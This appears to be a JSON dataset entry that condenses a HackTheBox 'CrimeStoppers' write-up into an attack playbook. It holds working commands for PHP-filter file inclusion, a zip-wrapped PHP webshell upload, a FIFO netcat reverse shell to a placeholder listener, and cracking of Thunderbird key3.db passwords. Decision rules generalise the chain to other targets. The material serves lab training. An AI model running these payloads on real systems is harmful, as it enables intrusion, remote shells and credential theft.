@@ -1,0 +1,880 @@
+{
+  "writeup_id": "Htb_Crimestoppers",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_lfi_to_rce_privesc",
+    "primary_services": [
+      "http",
+      "apache"
+    ],
+    "port_signature": "80",
+    "service_combination": "apache_web_server",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "lfi_to_rce",
+    "privilege_path": "web_to_user_to_root",
+    "attack_complexity": "hard",
+    "estimated_time": "3-4 hours",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "php_filter_lfi_bypass",
+      "source_code_disclosure",
+      "file_upload_functionality",
+      "cookie_based_admin_check"
+    ],
+    "environmental_clues": [
+      "apache_ubuntu_server",
+      "php_include_vulnerability",
+      "ip_based_upload_directories",
+      "csrf_token_implementation"
+    ],
+    "similar_scenarios": [
+      "include_htb_medium",
+      "poison_htb_medium"
+    ],
+    "unique_aspects": [
+      "mr_robot_themed_interface",
+      "whiterose_hint_system",
+      "mozilla_profile_privesc",
+      "custom_apache_module_backdoor"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "LFI_to_source_disclosure",
+        "success_reason": "PHP filter bypass allowed reading source code via base64 encoding",
+        "prerequisite_indicators": [
+          "php_application_present",
+          "get_parameter_includes_files",
+          "no_input_sanitization"
+        ],
+        "recognition_patterns": [
+          "URL pattern with ?op= parameter",
+          "php://filter/convert.base64-encode works",
+          "Error messages reveal file inclusion logic"
+        ],
+        "failure_modes": [
+          "input_validation_blocks_filters",
+          "whitelist_restricts_file_access",
+          "modern_php_security_settings"
+        ],
+        "environmental_factors": [
+          "older_php_version",
+          "default_php_configuration",
+          "developer_unfamiliar_with_lfi_risks"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "file_upload_to_rce",
+        "success_reason": "Zip file upload combined with PHP zip filter execution",
+        "prerequisite_indicators": [
+          "file_upload_functionality_exists",
+          "php_zip_filters_enabled",
+          "uploaded_files_accessible_via_web"
+        ],
+        "recognition_patterns": [
+          "file upload forms present",
+          "zip files accepted",
+          "predictable upload directory structure",
+          "php execution in upload directory"
+        ],
+        "failure_modes": [
+          "file_type_restrictions_enforced",
+          "uploads_outside_webroot",
+          "php_execution_disabled_in_uploads"
+        ],
+        "environmental_factors": [
+          "default_apache_configuration",
+          "php_zip_extension_enabled",
+          "insufficient_upload_restrictions"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "cookie_manipulation",
+        "success_reason": "Client-side admin cookie validation without server verification",
+        "prerequisite_indicators": [
+          "cookies_control_access",
+          "no_server_side_validation",
+          "admin_functionality_exists"
+        ],
+        "recognition_patterns": [
+          "admin=0 cookie set automatically",
+          "conditional content based on cookie value",
+          "no session validation on server"
+        ],
+        "failure_modes": [
+          "server_side_session_validation",
+          "signed_or_encrypted_cookies",
+          "proper_authentication_implementation"
+        ],
+        "environmental_factors": [
+          "inexperienced_developer",
+          "rapid_development_without_security_review",
+          "client_side_security_mindset"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "2-5 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "whiterose.txt hint file",
+        "discovery_method": "admin cookie bypass to access list.php",
+        "why_critical": "Confirmed RCE chain possibility and provided attack direction",
+        "how_to_recognize": [
+          "hidden admin functionality",
+          "developer left hints or notes",
+          "special files in upload directories"
+        ],
+        "follow_up_actions": [
+          "analyze_hint_for_attack_vectors",
+          "focus_on_parameter_chaining",
+          "look_for_rce_opportunities"
+        ]
+      },
+      {
+        "discovery": "predictable filename generation algorithm",
+        "discovery_method": "source code analysis via LFI",
+        "why_critical": "Enabled locating uploaded files for zip filter exploitation",
+        "how_to_recognize": [
+          "source code reveals genFilename function",
+          "uses predictable inputs like IP and user-agent",
+          "time-based components can be brute-forced"
+        ],
+        "follow_up_actions": [
+          "calculate_expected_filename",
+          "upload_malicious_zip_file",
+          "access_via_zip_filter"
+        ]
+      },
+      {
+        "discovery": "CSRF token bypass",
+        "discovery_method": "source code analysis showing commented validation",
+        "why_critical": "Allowed automated file upload without proper token validation",
+        "how_to_recognize": [
+          "if 1 == 1 instead of proper token check",
+          "commented out validation code",
+          "token present but not enforced"
+        ],
+        "follow_up_actions": [
+          "automate_file_upload_process",
+          "bypass_csrf_protection",
+          "chain_with_other_vulnerabilities"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_shell_access",
+        "escalation_method": "zip_filter_rce",
+        "why_possible": "PHP zip filters execute embedded PHP code from uploaded zip files",
+        "recognition_signs": [
+          "php_zip_extension_enabled",
+          "file_upload_accepts_zip_files",
+          "zip_filter_not_blocked"
+        ],
+        "exploitation_path": "Upload zip with PHP → Access via zip://path#file → Code execution"
+      },
+      {
+        "privilege_level": "limited_file_read",
+        "escalation_method": "lfi_to_source_disclosure",
+        "why_possible": "PHP filters bypass basic LFI protections and reveal source code",
+        "recognition_signs": [
+          "php_filter_wrappers_enabled",
+          "base64_encoding_successful",
+          "source_code_structure_revealed"
+        ],
+        "exploitation_path": "LFI → php://filter → base64 decode → source analysis → find new vectors"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only port 80 open on Linux host",
+        "decision": "Focus on web application enumeration and vulnerability discovery",
+        "reasoning": "Single HTTP port indicates web-focused attack surface",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "full_port_scan",
+            "when": "if initial web enum fails"
+          },
+          {
+            "option": "subdomain_enumeration",
+            "when": "if virtual hosts suspected"
+          }
+        ],
+        "success_indicators": [
+          "directory_enumeration_results",
+          "parameter_discovery",
+          "source_code_disclosure"
+        ],
+        "next_decision": "analyze_web_application_structure"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered GET parameter 'op' in URL structure",
+        "decision": "Test for Local File Inclusion (LFI) vulnerability",
+        "reasoning": "Parameter-based page inclusion is common LFI vector",
+        "confidence": 0.85,
+        "prerequisites": [
+          "parameter_identified",
+          "dynamic_content_confirmed"
+        ],
+        "success_indicators": [
+          "file_disclosure_achieved",
+          "source_code_obtained"
+        ],
+        "failure_fallbacks": [
+          "sql_injection_testing",
+          "xss_testing",
+          "upload_functionality"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "LFI confirmed but null byte bypass blocked",
+        "decision": "Use PHP filters to extract source code",
+        "reasoning": "PHP filter wrappers bypass extension restrictions",
+        "confidence": 0.95,
+        "prerequisites": [
+          "lfi_confirmed",
+          "php_backend_identified"
+        ],
+        "success_indicators": [
+          "source_code_extracted",
+          "application_logic_understood"
+        ],
+        "next_decision": "analyze_source_for_escalation_paths"
+      },
+      {
+        "step": 4,
+        "situation": "Found file upload functionality with uncontrolled filename",
+        "decision": "Combine LFI with file upload for RCE via zip wrapper",
+        "reasoning": "Zip wrapper allows code execution through uploaded archives",
+        "confidence": 0.8,
+        "prerequisites": [
+          "upload_functionality_found",
+          "lfi_confirmed",
+          "zip_wrapper_available"
+        ],
+        "success_indicators": [
+          "zip_file_uploaded",
+          "code_execution_achieved"
+        ],
+        "alternatives": [
+          {
+            "option": "phar_wrapper",
+            "when": "if zip wrapper fails"
+          },
+          {
+            "option": "log_poisoning",
+            "when": "if upload restrictions too strict"
+          }
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_lfi_found": {
+        "action": "extract_application_source_code",
+        "tools": [
+          "php_filter_wrappers",
+          "base64_decode"
+        ],
+        "next_phase": "analyze_source_for_vulnerabilities"
+      },
+      "if_upload_found": {
+        "action": "test_upload_restrictions_and_combine_with_lfi",
+        "alternatives": [
+          "zip_wrapper_rce",
+          "phar_deserialization",
+          "log_poisoning"
+        ],
+        "decision_criteria": "based_on_upload_restrictions_and_available_wrappers"
+      },
+      "if_rce_achieved": {
+        "action": "establish_interactive_shell",
+        "tools": [
+          "reverse_shell",
+          "fifo_pipes",
+          "python_pty"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_source_code_obtained": {
+        "action": "analyze_for_authentication_bypass_and_hidden_functionality",
+        "purpose": "find_privilege_escalation_vectors",
+        "focus_areas": [
+          "cookie_manipulation",
+          "hidden_parameters",
+          "file_paths"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_php_filters_when_lfi_found",
+        "reasoning": "php_filters_bypass_most_restrictions_and_reveal_source",
+        "applicability": "php_applications_with_lfi"
+      },
+      {
+        "rule": "combine_lfi_with_upload_for_rce",
+        "reasoning": "uploaded_files_can_be_executed_through_lfi_wrappers",
+        "applicability": "lfi_and_upload_functionality_present"
+      },
+      {
+        "rule": "extract_all_source_files_when_lfi_confirmed",
+        "reasoning": "source_code_reveals_hidden_functionality_and_escalation_paths",
+        "applicability": "any_lfi_vulnerability"
+      },
+      {
+        "rule": "test_zip_wrapper_before_other_methods",
+        "reasoning": "zip_wrapper_reliable_and_bypasses_many_restrictions",
+        "applicability": "file_upload_with_lfi_available"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "LFI_to_RCE_via_PHP_Filters",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "php"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "php_enabled_webserver",
+          "file_inclusion_vulnerability",
+          "php_filter_wrappers_enabled",
+          "file_upload_functionality"
+        ],
+        "success_indicators": [
+          "php_source_code_retrieved",
+          "base64_encoded_response",
+          "file_upload_accepts_arbitrary_content",
+          "predictable_upload_directory"
+        ],
+        "incompatible_with": [
+          "php_filter_wrappers_disabled",
+          "strict_file_upload_validation",
+          "chrooted_environment",
+          "disabled_include_functions"
+        ],
+        "confidence_boosters": [
+          "error_messages_reveal_php_paths",
+          "directory_traversal_responses",
+          "php_version_headers_present"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "Directory_Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_disabled",
+          "hidden_directories_exist"
+        ],
+        "success_indicators": [
+          "status_200_responses",
+          "different_content_lengths",
+          "redirect_responses_301_302"
+        ],
+        "incompatible_with": [
+          "aggressive_rate_limiting",
+          "ip_blocking_enabled",
+          "honeypot_responses"
+        ],
+        "confidence_boosters": [
+          "common_cms_patterns",
+          "standard_web_frameworks",
+          "default_installations"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Cookie_Manipulation",
+        "mitre_id": "T1539",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "session_management_present",
+          "client_side_authorization_checks",
+          "predictable_cookie_values"
+        ],
+        "success_indicators": [
+          "different_content_with_modified_cookies",
+          "admin_functionality_revealed",
+          "privilege_escalation_achieved"
+        ],
+        "incompatible_with": [
+          "server_side_session_validation",
+          "encrypted_session_tokens",
+          "proper_authorization_checks"
+        ],
+        "confidence_boosters": [
+          "simple_cookie_values_0_1",
+          "role_based_cookies",
+          "debug_mode_enabled"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "2-5 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "php_web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "PHP",
+          "X-Powered-By: PHP",
+          ".php"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "apache_server": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "Server: Apache"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "file_upload_functionality": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "multipart/form-data",
+          "file upload",
+          "browse button"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_functionality_and_files"
+        },
+        {
+          "attack": "cookie_manipulation",
+          "when": "session_cookies_present",
+          "reason": "quick_privilege_escalation_check"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "lfi_php_filter_exploitation",
+          "when": "php_application_with_parameters",
+          "reason": "source_code_disclosure_leads_to_rce"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Local File Inclusion (LFI)",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -sD - {target}/?op=php://filter/convert.base64-encode/resource={file} | tail -1 | base64 -d",
+            "actual_command": "curl -sD - 10.10.10.80/?op=php://filter/convert.base64-encode/resource=home | head -44 | tail -1 | cut -d' ' -f1 | base64 -d > home.php",
+            "output_pattern": "base64 encoded file contents",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_include_parameter",
+          "php_filter_wrappers_enabled"
+        ],
+        "success_indicators": [
+          "source_code_extracted",
+          "sensitive_files_readable",
+          "application_logic_revealed"
+        ],
+        "common_failures": [
+          "null_byte_injection_blocked",
+          "path_traversal_filtered",
+          "wrapper_functions_disabled"
+        ],
+        "follow_up_techniques": [
+          "zip_wrapper_rce",
+          "log_poisoning",
+          "session_file_inclusion"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "ZIP Wrapper RCE",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "zip",
+            "command_template": "zip {zipfile} {phpfile}",
+            "actual_command": "zip shell.zip cmd.php",
+            "output_pattern": "adding: cmd.php (stored 0%)",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -X POST -F \"tip=<{zipfile}\" -F \"token={csrf}\" -F \"submit=Send Tip!\" {target}",
+            "actual_command": "curl -X POST -sD - -F \"tip=<shell.zip\" -F \"name=a\" -F \"token=f7ab6fe8906a56cc11bc34238be8d1f5efd324c2dceb7f216c512fdea8b17a5e\" -F \"submit=Send Tip!\" http://10.10.10.80/?op=upload",
+            "success_factors": [
+              "valid_csrf_token",
+              "file_upload_allowed",
+              "zip_wrapper_enabled"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality",
+          "lfi_vulnerability",
+          "zip_wrapper_enabled",
+          "csrf_token_obtainable"
+        ],
+        "success_indicators": [
+          "zip_file_uploaded_successfully",
+          "php_code_execution_achieved",
+          "system_commands_executable"
+        ],
+        "common_failures": [
+          "zip_wrapper_disabled",
+          "file_upload_restrictions",
+          "csrf_protection_blocking"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Mozilla Profile Password Extraction",
+        "mitre_id": "T1555.003",
+        "category": "credential_access",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "mozilla2john.py",
+            "command_template": "/opt/JohnTheRipper/run/mozilla2john.py {key3_db_file}",
+            "actual_command": "/opt/JohnTheRipper/run/mozilla2john.py key3.db",
+            "output_pattern": "$mozilla$*3*20*1*{hash}",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "john",
+            "command_template": "./john {hash_file} -w {wordlist}",
+            "actual_command": "./john ~/hackthebox/crimestoppers-10.10.10.80/key3.db.john -w /usr/share/wordlists/rockyou.txt",
+            "success_factors": [
+              "weak_master_password",
+              "common_wordlist_hit"
+            ],
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "thunderbird_profile_accessible",
+          "key3_db_file_present",
+          "file_system_read_access"
+        ],
+        "success_indicators": [
+          "master_password_cracked",
+          "stored_credentials_accessible",
+          "email_account_access_gained"
+        ],
+        "common_failures": [
+          "strong_master_password",
+          "encrypted_profile_data",
+          "missing_key_files"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "email_enumeration",
+          "further_privilege_escalation"
+        ],
+        "time_investment": "20-60 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "wfuzz"
+        ],
+        "best_practices": [
+          "use_multiple_wordlists",
+          "include_common_extensions",
+          "run_in_background_during_manual_testing"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "http_request_manipulation",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_exploitation",
+          "api_testing"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "wget",
+          "httpie"
+        ],
+        "best_practices": [
+          "use_proxy_for_debugging",
+          "handle_csrf_tokens_properly",
+          "follow_redirects_when_needed"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "lfi_to_rce_via_zip_wrapper",
+        "steps": [
+          {
+            "step": 1,
+            "command": "gobuster -u http://10.10.10.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php",
+            "purpose": "Enumerate web directories and files",
+            "expected_output": "Discovery of upload.php, view.php, etc."
+          },
+          {
+            "step": 2,
+            "command": "curl -sD - 10.10.10.80/?op=php://filter/convert.base64-encode/resource=index | tail -1 | base64 -d",
+            "purpose": "Extract PHP source code via LFI",
+            "expected_output": "Base64 decoded PHP source code"
+          },
+          {
+            "step": 3,
+            "command": "echo '<?php echo system($_GET[\"cmd\"]); ?>' > cmd.php && zip shell.zip cmd.php",
+            "purpose": "Create PHP webshell in ZIP format",
+            "expected_output": "ZIP file containing PHP shell"
+          },
+          {
+            "step": 4,
+            "command": "curl -X POST -F \"tip=<shell.zip\" -F \"token=[CSRF_TOKEN]\" -F \"submit=Send Tip!\" http://10.10.10.80/?op=upload",
+            "purpose": "Upload ZIP file through form",
+            "expected_output": "Location header with uploaded filename"
+          },
+          {
+            "step": 5,
+            "command": "curl \"http://10.10.10.80/?op=zip://uploads/[IP]/[FILENAME]%23cmd&cmd=id\"",
+            "purpose": "Execute commands via ZIP wrapper",
+            "expected_output": "Command execution output"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "30-60 minutes"
+      },
+      {
+        "sequence_name": "fifo_reverse_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nc -lnvp 8081",
+            "purpose": "Start netcat listener",
+            "expected_output": "Listening on port 8081"
+          },
+          {
+            "step": 2,
+            "command": "curl \"http://10.10.10.80/?op=zip://uploads/[IP]/[FILE]%23cmd&cmd=rm%20/tmp/d;%20mkfifo%20/tmp/d;%20cat%20/tmp/d%20|%20/bin/sh%20-i%202%3E%261|nc%20[LHOST]%20[LPORT]%20%3E%20/tmp/d\"",
+            "purpose": "Execute FIFO reverse shell payload",
+            "expected_output": "Reverse shell connection established"
+          },
+          {
+            "step": 3,
+            "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "purpose": "Upgrade to interactive shell",
+            "expected_output": "Interactive bash shell"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "CrimeStoppers",
+      "difficulty": "Hard",
+      "os": "Linux (Ubuntu 17.04)",
+      "platform": "HackTheBox",
+      "release_date": "2018-01-06",
+      "author": "ippsec",
+      "estimated_time": "3-4 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "lfi",
+        "rce",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "local_file_inclusion",
+        "file_upload",
+        "apache_module_exploitation"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "lfi_to_rce",
+        "mozilla_profile_exploitation",
+        "apache_module_reverse_engineering"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "linux_privilege_escalation",
+        "reverse_engineering"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "local_file_inclusion",
+        "reverse_engineering",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "persistence"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "file_upload_restrictions",
+        "apache_module_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Poison",
+        "Nineveh",
+        "Hawk"
+      ],
+      "similarity_reasons": [
+        "lfi_exploitation",
+        "web_to_system_pivot",
+        "complex_privilege_escalation"
+      ],
+      "unique_aspects": [
+        "mozilla_profile_abuse",
+        "apache_module_modification",
+        "mr_robot_theme"
+      ],
+      "difficulty_factors": [
+        "multi_stage_exploitation",
+        "reverse_engineering_required",
+        "complex_attack_chain"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:09:17.673300",
+    "original_file": "0xdf_writeups/Htb Crimestoppers.md",
+    "content_length": 32166,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
